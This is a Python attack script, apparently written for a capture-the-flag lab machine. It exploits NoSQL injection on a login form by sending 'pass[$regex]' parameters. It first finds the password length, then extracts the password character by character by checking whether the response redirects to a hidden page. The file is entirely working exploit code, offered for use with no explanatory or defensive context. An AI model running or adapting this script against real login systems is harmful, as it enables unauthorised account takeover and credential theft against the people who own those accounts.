import requests
import sys

def break_regex(user, num):
    url = "http://10.10.107.36/login.php"
    headers = {
        'Host': '10.10.107.36',
        'Cache-Control': 'max-age=0',
        'Accept-Language': 'en-US,en;q=0.9',
        'Origin': 'http://10.10.107.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Referer': 'http://10.10.107.36/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
    }
    data = {
        'user': f'{user}',
        'pass[$regex]': f'^.{{{num}}}$',  # Testing length regex
        'remember': 'on',
    }

    response = requests.post(url, headers=headers, data=data, allow_redirects=False)
    return response

def break_pass(user, regex):
    url = "http://10.10.107.36/login.php"
    headers = {
        'Host': '10.10.107.36',
        'Cache-Control': 'max-age=0',
        'Accept-Language': 'en-US,en;q=0.9',
        'Origin': 'http://10.10.107.36',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Referer': 'http://10.10.107.36/',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
    }
    data = {
        'user': f'{user}',
        'pass[$regex]': regex,
        'remember': 'on',
    }

    response = requests.post(url, headers=headers, data=data, allow_redirects=False)
    return response

def break_password(username):
    user = username
    num = 1  # We will start by guessing the length of the password

    # First, we determine the length of the password by increasing num
    while True:
        response = break_regex(user, num)

        if not response:
            print("Failed to get response")
            continue

        response_header = response.headers.get('Location')
        if response_header == '/sekr3tPl4ce.php':
            print(f"Password length found: {num}")
            break

        num += 1

    # Once we have the password length, we start building the password one character at a time
    password = ""
    charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

    for i in range(num):
        found = False

        for char in charset:
            test_regex_pattern = f'^{password}{char}{"." * (num - len(password) - 1)}$'
            response = break_pass(user, test_regex_pattern)

            if not response:
                print("Failed to get response")
                continue

            response_header = response.headers.get('Location')
            if response_header == '/sekr3tPl4ce.php':
                password += char
                print(f"Password so far: {password}")
                found = True
                break

        if not found:
            print("Could not find the next character. Stopping.")
            break

    print(f"Password cracked: {password}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <username>")
        sys.exit(1)

    username = sys.argv[1]

    break_password(username)
